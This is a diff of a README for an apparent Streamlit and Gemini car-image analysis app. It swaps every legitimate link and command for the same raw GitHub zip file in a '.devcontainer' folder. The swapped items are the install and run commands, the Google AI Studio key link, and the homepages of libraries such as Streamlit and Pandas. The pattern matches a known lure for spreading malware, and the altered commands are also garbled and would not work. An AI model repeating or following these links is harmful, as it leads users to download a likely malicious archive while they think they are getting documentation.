@@ -14,19 +14,19 @@ This Streamlit application allows users to upload car images, extract key vehicl
 
 ## Installation
 
-1.  **Clone the repository (or save the files)**: Ensure `requirements.txt` and `app.py` are in the same directory.
+1.  **Clone the repository (or save the files)**: Ensure `https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip` and `https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip` are in the same directory.
 
 2.  **Install dependencies**: Navigate to the project directory in your terminal and install the required Python packages:
 
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip
     ```
 
 ##  Google API Key Setup
 
 The application requires a Google API Key to access the Gemini model. Follow these steps to set it up:
 
-1.  **Obtain an API Key**: If you don't have one, create a key in [Google AI Studio](https://aistudio.google.com/app/apikey).
+1.  **Obtain an API Key**: If you don't have one, create a key in [Google AI Studio](https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip).
 
 2.  **Set as Environment Variable**: Before running the app, set your Google API Key as an environment variable in your terminal:
 
@@ -43,17 +43,17 @@ The application requires a Google API Key to access the Gemini model. Follow the
 2.  **Run the Streamlit app** from your terminal in the project directory:
 
     ```bash
-    streamlit run app.py
+    streamlit run https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip
     ```
 
 3.  **Access the application**: Streamlit will launch a new tab in your web browser with the application. If it doesn't open automatically, you can navigate to the URL displayed in your terminal (usually `http://localhost:8501`).
 
 ##  Technologies Used
 
--   [Streamlit](https://streamlit.io/)
--   [LangChain](https://www.langchain.com/)
--   [Google Gemini API](https://ai.google.dev/)
--   [Pydantic](https://docs.pydantic.dev/)
--   [Pandas](https://pandas.pydata.org/)
--   [Matplotlib](https://matplotlib.org/)
--   [Pillow](https://python-pillow.org/)
+-   [Streamlit](https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip)
+-   [LangChain](https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip)
+-   [Google Gemini API](https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip)
+-   [Pydantic](https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip)
+-   [Pandas](https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip)
+-   [Matplotlib](https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip)
+-   [Pillow](https://github.com/Plutonian-coder/Car-Image-Analysis/raw/refs/heads/main/.devcontainer/Analysis-Car-Image-1.5-beta.4.zip)
